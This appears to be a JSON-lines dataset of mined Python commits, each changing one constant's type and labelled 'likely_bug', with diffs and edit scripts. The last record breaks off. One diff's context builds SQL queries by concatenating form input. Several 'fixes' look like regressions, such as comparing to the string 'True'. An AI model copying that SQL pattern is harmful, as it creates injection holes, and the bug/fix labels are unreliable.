{"project": "pyfpdf", "commit_sha": "dff2b38684877636f79100bb6ce4fe8d9d49db55", "parent_sha": "ee2682e49cef41051ff544d878a72ba5c880143f", "file_path": "fpdf/fpdf.py", "project_url": "https://github.com/mishin/pyfpdf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class FPDF(object):\n         elif(unit=='cm'):\n             self.k=72/2.54\n         elif(unit=='in'):\n-            self.k=72\n+            self.k=72.\n         else:\n             self.error('Incorrect unit: '+unit)\n         # Page format\n", "before": "self . k = 72", "after": "self . k = 72.", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 22], [\"float:72.\", \"T\"], 2], [\"Delete\", [\"integer:72\", 3, 20, 3, 22]]]"}
{"project": "Landlab", "commit_sha": "b187356572f57dfb196b841e4d36c07bfb22df40", "parent_sha": "aaa395348b0487ca788136087d93718afb087c57", "file_path": "landlab/components/landslides/landslide.py", "project_url": "https://github.com/Glader011235/Landlab", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -206,7 +206,7 @@ class LandslideProbability(Component):\n \r\n # Run Component\r\n     @use_file_name_or_kwds\r\n-    def __init__(self, grid, number_of_simulations=250.,\r\n+    def __init__(self, grid, number_of_simulations=250,\r\n                  groundwater__recharge_minimum=20.,\r\n                  groundwater__recharge_maximum=120., **kwds):\r\n \r\n", "before": "def __init__ ( self , grid , number_of_simulations = 250. , groundwater__recharge_minimum = 20. , groundwater__recharge_maximum = 120. , ** kwds ) : ", "after": "def __init__ ( self , grid , number_of_simulations = 250 , groundwater__recharge_minimum = 20. , groundwater__recharge_maximum = 120. , ** kwds ) : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 30, 3, 56], [\"integer:250\", \"T\"], 2], [\"Delete\", [\"float:250.\", 3, 52, 3, 56]]]"}
{"project": "Landlab", "commit_sha": "5e89da906d65c863a09c0dda61c22c6f9b6262c4", "parent_sha": "30e6aa267e1f33a2e5cc67ddaec89169d3a923dc", "file_path": "landlab/components/overland_flow/generate_overland_flow_deAlmeida.py", "project_url": "https://github.com/Glader011235/Landlab", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -690,7 +690,7 @@ class OverlandFlow(Component):\n \n         discharge_vals = discharge_vals.reshape(self.grid.number_of_nodes, 4)\n \n-        discharge_vals = discharge_vals.sum(axis=1.0)\n+        discharge_vals = discharge_vals.sum(axis=1)\n \n         return discharge_vals\n \n", "before": "discharge_vals = discharge_vals . sum ( axis = 1.0 )", "after": "discharge_vals = discharge_vals . sum ( axis = 1 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 45, 3, 53], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"float:1.0\", 3, 50, 3, 53]]]"}
{"project": "explicit-semantic-analysis", "commit_sha": "31da53941c49d6c0d55ee9dfeb9e8fe27c8f3ddf", "parent_sha": "770f2caf875bb2db1cd94a976023d40d38e68903", "file_path": "src/SemanticRelatedness/semanticRelatednessCalculator.py", "project_url": "https://github.com/ayushjaiswal/explicit-semantic-analysis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class SemanticRelatednessCalculatorESA:\n         vector1_norm = self.__getNorm(vector1)\n         vector2_norm = self.__getNorm(vector2)\n         if vector1_norm == 0 or vector2_norm == 0:\n-            return 0\n+            return 0.0\n         else:\n             cosineSimilarity = dotProduct / (vector1_norm * vector2_norm)\n             return cosineSimilarity\n", "before": "return 0", "after": "return 0.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 13, 3, 21], [\"float:0.0\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 20, 3, 21]]]"}
{"project": "browsermob-proxy-py", "commit_sha": "6ca435efa3758bc192b43d19ed702fdf21d6399e", "parent_sha": "35b24a955874a84efc6e78f508b83cb2e726f9c2", "file_path": "browsermob.py", "project_url": "https://github.com/davbo/browsermob-proxy-py", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class BrowserMobProxyHub(object):\n \n-    def __init__(self, hostname='localhost', port='8080'):\n+    def __init__(self, hostname='localhost', port=8080):\n         self.hostname = hostname\n         self.port = port\n \n", "before": "def __init__ ( self , hostname = 'localhost' , port = '8080' ) : self . hostname = hostname self . port = port", "after": "def __init__ ( self , hostname = 'localhost' , port = 8080 ) : self . hostname = hostname self . port = port", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 1, 46, 1, 57], [\"integer:8080\", \"T\"], 2], [\"Delete\", [\"string:'8080'\", 1, 51, 1, 57]]]"}
{"project": "tippresence", "commit_sha": "980f52b40938ac17f27166756832e3be69f905f3", "parent_sha": "975e02a4f7f5ac0c780bd70e24d8132b79a64b4d", "file_path": "tipsip/tests/test_sip_uri.py", "project_url": "https://github.com/ivaxer/tippresence", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ class URITest(unittest.TestCase):\n         uri = URI.parse('sips:example.com:5060')\n         aq(uri.scheme, 'sips')\n         aq(uri.host, 'example.com')\n-        aq(uri.port, '5060')\n+        aq(uri.port, 5060)\n \n     def test_constructing(self):\n         aq = self.assertEqual\n", "before": "aq ( uri . port , '5060' )", "after": "aq ( uri . port , 5060 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 11, 3, 29], [\"integer:5060\", \"T\"], 3], [\"Delete\", [\"string:'5060'\", 3, 22, 3, 28]]]"}
{"project": "MakiFlow", "commit_sha": "f8b351c435660e0e8d60afa58e34c8bc91e85928", "parent_sha": "09822839ec746b8c93ed9137d87f40f5c5c5dc70", "file_path": "makiflow/models/segmentation/segmentator.py", "project_url": "https://github.com/MakiResearchTeam/MakiFlow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -185,7 +185,7 @@ class Segmentator(MakiModel):\n         # [batch_sz, total_predictions]\n         sparse_confidences = tf.reduce_max(filtered_confidences, axis=-1)\n         # Create Maki Polynomial\n-        maki_polynomial = tf.constant(0)\n+        maki_polynomial = tf.constant(0.0)\n         for i in range(1, self._maki_gamma+1):\n             maki_polynomial += sparse_confidences**i * \\\n                                tf.constant(\n", "before": "maki_polynomial = tf . constant ( 0 )", "after": "maki_polynomial = tf . constant ( 0.0 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 38, 3, 41], [\"float:0.0\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 39, 3, 40]]]"}
{"project": "MakiFlow", "commit_sha": "a9d2f08f153b28bd3c6c39c5d3d10433e49f8fac", "parent_sha": "96c77f54dcd0b06741df54e2f3ab5bfc29312f0a", "file_path": "makiflow/models/regressor/core/regressor_trainer.py", "project_url": "https://github.com/MakiResearchTeam/MakiFlow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class RegressorTrainer(MakiTrainer, ABC):\n             label = self.get_labels()[name]\n             losses.append(self._build_local_loss(prediction, label))\n             super().track_loss(losses[-1], name)\n-        return tf.add_n([0, *losses], name='total_loss')\n+        return tf.add_n([0.0, *losses], name='total_loss')\n \n     def _setup_label_placeholders(self):\n         logits = super().get_model().get_logits()\n", "before": "return tf . add_n ( [ 0 , * losses ] , name = 'total_loss' )", "after": "return tf . add_n ( [ 0.0 , * losses ] , name = 'total_loss' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"list\", 3, 25, 3, 37], [\"float:0.0\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 26, 3, 27]]]"}
{"project": "mailmerge", "commit_sha": "d15d19e3dab6b03378cb0806f2a24b73e4615030", "parent_sha": "4f0c60e530f8e66e33c7694727e8e613276a762e", "file_path": "mailmerge/sendmail_client.py", "project_url": "https://github.com/awdeorio/mailmerge", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ class SendmailClient(object):\n         # Check if we've hit the rate limit\n         now = datetime.datetime.now()\n         if self.config.ratelimit and self.lastsent:\n-            waittime = datetime.timedelta(minutes=1 / self.config.ratelimit)\n+            waittime = datetime.timedelta(minutes=1.0 / self.config.ratelimit)\n             if now - self.lastsent < waittime:\n                 raise exceptions.MailmergeRateLimitError()\n \n", "before": "waittime = datetime . timedelta ( minutes = 1 / self . config . ratelimit )", "after": "waittime = datetime . timedelta ( minutes = 1.0 / self . config . ratelimit )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 51, 3, 76], [\"float:1.0\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 51, 3, 52]]]"}
{"project": "sf2heat", "commit_sha": "b168b009970bb17564f458fd3432e42f99dded38", "parent_sha": "8c236bf3b5a8ef76f817dc5d00d469a98491f009", "file_path": "sf2heat/nsdtranslator.py", "project_url": "https://github.com/superfluidity/sf2heat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -115,7 +115,7 @@ class NSDTranslator(object):\n             flavor_id = str(vnf_data['deploymentFlavour'][0]['flavourId'])\n             flav_to_create = self._get_properties_from_metadata(flavor_id, \"createVIMFlavor\", vnf_data)\n             print flav_to_create\n-            if 'createVIMFlavor' in flav_to_create and flav_to_create['createVIMFlavor'] is True:\n+            if 'createVIMFlavor' in flav_to_create and flav_to_create['createVIMFlavor'] is 'True':\n                 flavor_name = 'flavor_' + vdu_data['vduId']\n                 result['flavor'] = {'get_resource': str(flavor_name)}\n                 flavor_res = self._get_nova_flavor(flavor_name, vdu_data, vnf_data)\n", "before": "if 'createVIMFlavor' in flav_to_create and flav_to_create [ 'createVIMFlavor' ] is True : flavor_name = 'flavor_' + vdu_data [ 'vduId' ] result [ 'flavor' ] = { 'get_resource' : str ( flavor_name ) } flavor_res = self . _get_nova_flavor ( flavor_name , vdu_data , vnf_data )", "after": "if 'createVIMFlavor' in flav_to_create and flav_to_create [ 'createVIMFlavor' ] is 'True' : flavor_name = 'flavor_' + vdu_data [ 'vduId' ] result [ 'flavor' ] = { 'get_resource' : str ( flavor_name ) } flavor_res = self . _get_nova_flavor ( flavor_name , vdu_data , vnf_data )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 56, 3, 97], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 93, 3, 97]]]"}
{"project": "iot-python", "commit_sha": "7c1c1773d5d888ddeb3b39df40aca045cf45a8e0", "parent_sha": "36d7c6044d36455348fdf6e90965055ba2cc23e9", "file_path": "src/ibmiotf/gateway.py", "project_url": "https://github.com/ZoetropeLabs/iot-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -751,7 +751,7 @@ class ManagedClient(Client):\n \n def ParseConfigFile(configFilePath):\n     parms = configparser.ConfigParser({\"domain\": \"internetofthings.ibmcloud.com\",\n-                                       \"port\": 1883, \"clean-session\": \"true\"})\n+                                       \"port\": \"1883\", \"clean-session\": \"true\"})\n     sectionHeader = \"gateway\"\n     try:\n         with open(configFilePath) as f:\n", "before": "parms = configparser . ConfigParser ( { \"domain\" : \"internetofthings.ibmcloud.com\" , \"port\" : 1883 , \"clean-session\" : \"true\" } )", "after": "parms = configparser . ConfigParser ( { \"domain\" : \"internetofthings.ibmcloud.com\" , \"port\" : \"1883\" , \"clean-session\" : \"true\" } )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 40, 3, 52], [\"string:\\\"1883\\\"\", \"T\"], 2], [\"Delete\", [\"integer:1883\", 3, 48, 3, 52]]]"}
{"project": "anking", "commit_sha": "5d7dc23f708efe75ec8759870faf3d03cbb866db", "parent_sha": "9f5135b7e69a0d321eac21c22598207fd9453856", "file_path": "anking/deckchooser.py", "project_url": "https://github.com/muflax-scholars/anking", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class DeckChooser(QHBoxLayout):\n         decks = sendToAnki(\"decks\")\n         deck_name = \"Default\"\n         for deck in decks:\n-            if deck['id'] == \"1\":\n+            if deck['id'] == 1:\n                 deck_name = deck[\"name\"]\n                 break\n         self.deck.setText(deck_name)\n", "before": "if deck [ 'id' ] == \"1\" : deck_name = deck [ \"name\" ] break", "after": "if deck [ 'id' ] == 1 : deck_name = deck [ \"name\" ] break", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 33], [\"integer:1\", \"T\"], 2], [\"Delete\", [\"string:\\\"1\\\"\", 3, 30, 3, 33]]]"}
{"project": "Bcloud_Main_Server", "commit_sha": "64389e28eaf489548844d3f25a014e52ef901274", "parent_sha": "6027cc1965363d184274076a350641ba0bba73dc", "file_path": "HTTP_Front_Module/HTTP_Server_Com.py", "project_url": "https://github.com/navetal39/Bcloud_Main_Server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def secure_accept(server_socket):\n     cs,ca = server_socket.accept()\n     return (cs, ca)\n \n-def secure_recv(sock, size = '5000'):\n+def secure_recv(sock, size = 5000):\n     ''' This method needs to receive the encrypted message (the ciphertext), decrypt it and return the plaintext.\n     '''\n     return sock.recv(size)\n", "before": "def secure_recv ( sock , size = '5000' ) : ''' This method needs to receive the encrypted message (the ciphertext), decrypt it and return the plaintext.\n     ''' return sock . recv ( size )", "after": "def secure_recv ( sock , size = 5000 ) : ''' This method needs to receive the encrypted message (the ciphertext), decrypt it and return the plaintext.\n     ''' return sock . recv ( size )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 23, 3, 36], [\"integer:5000\", \"T\"], 2], [\"Delete\", [\"string:'5000'\", 3, 30, 3, 36]]]"}
{"project": "f-flask", "commit_sha": "25094bd0ad293876f6af64a06a5e304e36f09089", "parent_sha": "edfe0056404002f94be83e5d573b2a262019d8ef", "file_path": "main.py", "project_url": "https://github.com/kosen10spajam/f-flask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ def rooms():\n def login(room_id):\r\n     sql.execute('SELECT playing_room FROM animals')\r\n     res = sql.fetchall()\r\n-    if all(x != '0' for x in [y[0] for y in res]):\r\n+    if all(x != 0 for x in [y[0] for y in res]):\r\n         sql.execute('UPDATE animals SET playing_room = 0')\r\n         _sql.commit()\r\n \r\n", "before": "if all ( x != '0' for x in [ y [ 0 ] for y in res ] ) : sql . execute ( 'UPDATE animals SET playing_room = 0' ) _sql . commit ( )", "after": "if all ( x != 0 for x in [ y [ 0 ] for y in res ] ) : sql . execute ( 'UPDATE animals SET playing_room = 0' ) _sql . commit ( )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 20], [\"integer:0\", \"T\"], 2], [\"Delete\", [\"string:'0'\", 3, 17, 3, 20]]]"}
{"project": "enigma2", "commit_sha": "c82943625f4dfa7e30c307d9eef6e47479c83abb", "parent_sha": "2d102920ade189677755565fd71c4965a41bfb96", "file_path": "lib/python/Components/Renderer/Pig.py", "project_url": "https://github.com/gdpablo/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class Pig(Renderer):\n \t\tattribs = self.skinAttributes[:]\n \t\tfor (attrib, value) in self.skinAttributes:\n \t\t\tif attrib == \"hidePip\":\n-\t\t\t\tself.hidePip = value == 1\n+\t\t\t\tself.hidePip = value == \"1\"\n \t\t\t\tattribs.remove((attrib,value))\n \t\t\t\tbreak\n \t\tself.skinAttributes = attribs\n", "before": "self . hidePip = value == 1", "after": "self . hidePip = value == \"1\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 20, 3, 30], [\"string:\\\"1\\\"\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 29, 3, 30]]]"}
{"project": "orange", "commit_sha": "0d3d8948dcd98f2c1dbd5997d93d52440bd1bfb9", "parent_sha": "efd88d3327758d413447d24b4621226b06988a95", "file_path": "orange/OrangeWidgets/Prototypes/OWSimon.py", "project_url": "https://github.com/kernc/orange", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -170,7 +170,7 @@ class OWSimon(OWWidget):\n         self.yTrace.append(robot.y)\n         self.log.append([len(self.log),\n                          robot.speed_left, robot.speed_right,\n-                         ((robot.speed_left + robot.speed_right) / 2), (robot.speed_left - robot.speed_right),\n+                         ((robot.speed_left + robot.speed_right) / 2.), (robot.speed_left - robot.speed_right),\n                          robot.x, robot.y, robot.orientation/pi*180,\n                          robot.ball_distance, robot.ball_angle/pi*180, robot.ball_area])\n                       \n", "before": "self . log . append ( [ len ( self . log ) , robot . speed_left , robot . speed_right , ( ( robot . speed_left + robot . speed_right ) / 2 ) , ( robot . speed_left - robot . speed_right ) , robot . x , robot . y , robot . orientation / pi * 180 , robot . ball_distance , robot . ball_angle / pi * 180 , robot . ball_area ] )", "after": "self . log . append ( [ len ( self . log ) , robot . speed_left , robot . speed_right , ( ( robot . speed_left + robot . speed_right ) / 2. ) , ( robot . speed_left - robot . speed_right ) , robot . x , robot . y , robot . orientation / pi * 180 , robot . ball_distance , robot . ball_angle / pi * 180 , robot . ball_area ] )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 27, 3, 69], [\"float:2.\", \"T\"], 2], [\"Delete\", [\"integer:2\", 3, 68, 3, 69]]]"}
{"project": "zulip", "commit_sha": "f87a0e912ba1ce8c0f3a87a15d6003fdf0b6fac4", "parent_sha": "9f8ba913fd519b83187210833c47a02128d74cc9", "file_path": "zerver/tests/test_queue.py", "project_url": "https://github.com/zulip/zulip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -18,7 +18,7 @@ class TestTornadoQueueClient(ZulipTestCase):\n     @mock.patch(\"zerver.lib.queue.ExceptionFreeTornadoConnection\", autospec=True)\n     def test_on_open_closed(self, mock_cxn: mock.MagicMock) -> None:\n         with self.assertLogs(\"zulip.queue\", \"WARNING\") as m:\n-            mock_cxn().channel.side_effect = ConnectionClosed(\"500\", \"test\")\n+            mock_cxn().channel.side_effect = ConnectionClosed(500, \"test\")\n             connection = TornadoQueueClient()\n             connection._on_open(mock.MagicMock())\n             self.assertEqual(\n", "before": "mock_cxn ( ) . channel . side_effect = ConnectionClosed ( \"500\" , \"test\" )", "after": "mock_cxn ( ) . channel . side_effect = ConnectionClosed ( 500 , \"test\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 62, 3, 77], [\"integer:500\", \"T\"], 1], [\"Delete\", [\"string:\\\"500\\\"\", 3, 63, 3, 68]]]"}
{"project": "python-miio", "commit_sha": "6ebbbbc17e88df277f5c53977307c8c23944bcb3", "parent_sha": "151ec30ffca031602f0fa0ab4cc33265209fdfc6", "file_path": "miio/airconditioningcompanion.py", "project_url": "https://github.com/rytilahti/python-miio", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class AirConditioningCompanionStatus:\n     @property\n     def power(self) -> str:\n         \"\"\"Current power state.\"\"\"\n-        return 'on' if (self.data[1][2:3] == 1) else 'off'\n+        return 'on' if (self.data[1][2:3] == '1') else 'off'\n \n     @property\n     def is_on(self) -> bool:\n", "before": "return 'on' if ( self . data [ 1 ] [ 2 : 3 ] == 1 ) else 'off'", "after": "return 'on' if ( self . data [ 1 ] [ 2 : 3 ] == '1' ) else 'off'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 47], [\"string:'1'\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 46, 3, 47]]]"}
{"project": "Database", "commit_sha": "fbdc090baaa73349aaf1d324a249abce8f8e98c8", "parent_sha": "e9fcf86aa0a62269f10c8d45fef3059448910510", "file_path": "app/views.py", "project_url": "https://github.com/dgjenni3/Database", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -102,7 +102,7 @@ def song_edit(song_url):\n \t\tsql_str = \"UPDATE Song SET Title='\" + request.form['title'] + \"', \" + \"Genre='\" + request.form['genre'] + \\\n \t\t\"', Track_type='\" + request.form['track_type'] + \"' WHERE Song_Url='\" + song_url + \"';\"\n \t\tupdated_song = db.engine.execute(sql_str)\n-\t\treturn render_template(\"edit.html\", error=False)\n+\t\treturn render_template(\"edit.html\", error='False')\n \telif request.method == 'GET':\n \t\tsql_str = \"SELECT * FROM Song WHERE Song_Url='\" + song_url + \"';\"\n \t\treq_song = db.engine.execute(sql_str).fetchall()\n", "before": "return render_template ( \"edit.html\" , error = False )", "after": "return render_template ( \"edit.html\" , error = 'False' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 39, 3, 50], [\"string:'False'\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 45, 3, 50]]]"}
{"project": "sKnock", "commit_sha": "184876923fcd93c8af8bd1bc3f81dcc325b54877", "parent_sha": "ef4aec310cbc7a1a6f6e519ea448e249915e2063", "file_path": "evaluation/firewall_processing_performance/fw_pp_eval_client.py", "project_url": "https://github.com/safecloud-project/sKnock", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def start(target, udp, ego_mode, rate_limit):\n \n     rate_limit_wait = None\n     if rate_limit is not None:\n-        rate_limit_wait = 1 / rate_limit\n+        rate_limit_wait = 1.0 / rate_limit\n \n     while not shutdown:\n         try:\n", "before": "rate_limit_wait = 1 / rate_limit", "after": "rate_limit_wait = 1.0 / rate_limit", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 27, 3, 41], [\"float:1.0\", \"T\"], 0], [\"Delete\", [\"integer:1\", 3, 27, 3, 28]]]"}
{"project": "weboob", "commit_sha": "35e42a451e17c76bf7e9463ce809ca0bebc9baaa", "parent_sha": "4f49f968804be0583df763ac5e53c861afb6ec2f", "file_path": "modules/allocine/browser.py", "project_url": "https://github.com/yannrouillard/weboob", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -212,7 +212,7 @@ class AllocineBrowser(BaseBrowser):\n             real_name = unicode(jres['realName'])\n         if 'gender' in jres:\n             gcode = jres['gender']\n-            if gcode == 1:\n+            if gcode == '1':\n                 gender = u'Male'\n             else:\n                 gender = u'Female'\n", "before": "if gcode == 1 : gender = u'Male' else : gender = u'Female'", "after": "if gcode == '1' : gender = u'Male' else : gender = u'Female'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 26], [\"string:'1'\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 25, 3, 26]]]"}
{"project": "profiletool", "commit_sha": "89bd0a1986f9c6b2c63a698d0863b2636ca5cc8c", "parent_sha": "ab51d83c7e07086358ee96d52e4c82ae492e6a0e", "file_path": "tools/plottingtool.py", "project_url": "https://github.com/PANOimagen/profiletool", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -238,7 +238,7 @@ class PlottingTool:\n \t\t\ttemp1 = wdg.plotWdg.figure.get_axes()[0].get_lines()\n \t\t\tfor i in range(len(temp1)):\n \t\t\t\tif name == str(temp1[i].get_gid()):\n-\t\t\t\t\ttemp1[i].set_color((color1.red() / 255 , color1.green() / 255.0 , color1.blue() / 255.0 ,  color1.alpha() / 255.0 ))\n+\t\t\t\t\ttemp1[i].set_color((color1.red() / 255.0 , color1.green() / 255.0 , color1.blue() / 255.0 ,  color1.alpha() / 255.0 ))\n \t\t\t\t\t#wdg.plotWdg.figure.get_axes()[0].redraw_in_frame()\n \t\t\t\t\twdg.plotWdg.draw()\n \t\t\t\t\tbreak\n", "before": "temp1 [ i ] . set_color ( ( color1 . red ( ) / 255 , color1 . green ( ) / 255.0 , color1 . blue ( ) / 255.0 , color1 . alpha ( ) / 255.0 ) )", "after": "temp1 [ i ] . set_color ( ( color1 . red ( ) / 255.0 , color1 . green ( ) / 255.0 , color1 . blue ( ) / 255.0 , color1 . alpha ( ) / 255.0 ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 26, 3, 44], [\"float:255.0\", \"T\"], 2], [\"Delete\", [\"integer:255\", 3, 41, 3, 44]]]"}
{"project": "Phys350NBody", "commit_sha": "559f7cd31a93ad92ccb6b56683b0b064ca750dc1", "parent_sha": "eaff11150736db84b8da404bd91767cdc407aa33", "file_path": "src/physics.py", "project_url": "https://github.com/dma14/Phys350NBody", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ def get_accel(state):\n     accel = np.array([0.0, 0.0])\n     for obj_rel in G_OBJECTS:\n         if state.tag == obj_rel.state.tag:\n-            if obj_rel.mass == 0:\n+            if obj_rel.mass == 0.0:\n                 return np.array([0.0, 0.0])\n         else:\n             # DEBUG\n", "before": "if obj_rel . mass == 0 : return np . array ( [ 0.0 , 0.0 ] )", "after": "if obj_rel . mass == 0.0 : return np . array ( [ 0.0 , 0.0 ] )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 33], [\"float:0.0\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 32, 3, 33]]]"}
{"project": "faraday", "commit_sha": "9060ada7a2a18fe1b0edeb3f03a9017bcb8c9f9d", "parent_sha": "4960bb4e557e5ba0731ff322418dc0cf6783cc91", "file_path": "faraday-server.py", "project_url": "https://github.com/Kamalonline4/faraday", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -140,7 +140,7 @@ def main():\n \n     else:\n         if not args.port:\n-            args.port = 5985\n+            args.port = '5985'\n \n     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n     result = sock.connect_ex((args.bind_address or server.config.faraday_server.bind_address, int(args.port or server.config.faraday_server.port)))\n", "before": "else : if not args . port : args . port = 5985", "after": "else : if not args . port : args . port = '5985'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 1, 5, 3, 29], [\"string:'5985'\", \"T\"], 5], [\"Delete\", [\"integer:5985\", 3, 25, 3, 29]]]"}
{"project": "cloudman", "commit_sha": "5ba5187c375fed977bcecdd051e5053b14efeab8", "parent_sha": "4f460aa4025f2f13cf63d46706f5ace756c1d5a7", "file_path": "cm/controllers/root.py", "project_url": "https://github.com/nturaga/cloudman", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -465,7 +465,7 @@ class CM(BaseController):\n             return comment\n \n     @expose\n-    def manage_service(self, trans, service_name, to_be_started=True, is_filesystem=False):\n+    def manage_service(self, trans, service_name, to_be_started='True', is_filesystem=False):\n", "before": "def manage_service ( self , trans , service_name , to_be_started = True , is_filesystem = False ) : ", "after": "def manage_service ( self , trans , service_name , to_be_started = 'True' , is_filesystem = False ) : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 51, 3, 69], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 65, 3, 69]]]"}
{"project": "converters_old", "commit_sha": "f738628dc2f988844491c230a160cfcdcb6d2fa0", "parent_sha": "9a16b59329ab23cefa652304bd207868133e37b8", "file_path": "converters/__init__.py", "project_url": "https://github.com/gabejackson/converters_old", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,4 +73,4 @@ def element_in_list(element, list):\n     return False\n \n def surface_of_triangle(grundlinie, hoehe):\n-    return grundlinie*hoehe/2\n+    return grundlinie*hoehe/2.0\n", "before": "return grundlinie * hoehe / 2", "after": "return grundlinie * hoehe / 2.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 12, 3, 30], [\"float:2.0\", \"T\"], 2], [\"Delete\", [\"integer:2\", 3, 29, 3, 30]]]"}
{"project": "PyWPS-SVN", "commit_sha": "8e3f546302533c7da3473ea5df0af1372a5b5429", "parent_sha": "23dd89ff4e6dd9d9afac8cfa68763aa3db2c1dbc", "file_path": "pywps/Process/__init__.py", "project_url": "https://github.com/jachym/PyWPS-SVN", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -248,7 +248,7 @@ class WPSProcess:\n     pywps = None\n \n     def __init__(self, identifier, title = None, abstract=None,\n-            metadata=[],profile=[], version=None,\n+            metadata=[],profile=[], version=\"None\",\n             statusSupported=True, storeSupported=False, grassLocation=None,\n             logFile = sys.stderr):\n         \"\"\"Contructor\"\"\"\n", "before": "def __init__ ( self , identifier , title = None , abstract = None , metadata = [ ] , profile = [ ] , version = None , statusSupported = True , storeSupported = False , grassLocation = None , logFile = sys . stderr ) : \"\"\"Contructor\"\"\"", "after": "def __init__ ( self , identifier , title = None , abstract = None , metadata = [ ] , profile = [ ] , version = \"None\" , statusSupported = True , storeSupported = False , grassLocation = None , logFile = sys . stderr ) : \"\"\"Contructor\"\"\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 37, 3, 49], [\"string:\\\"None\\\"\", \"T\"], 2], [\"Delete\", [\"none:None\", 3, 45, 3, 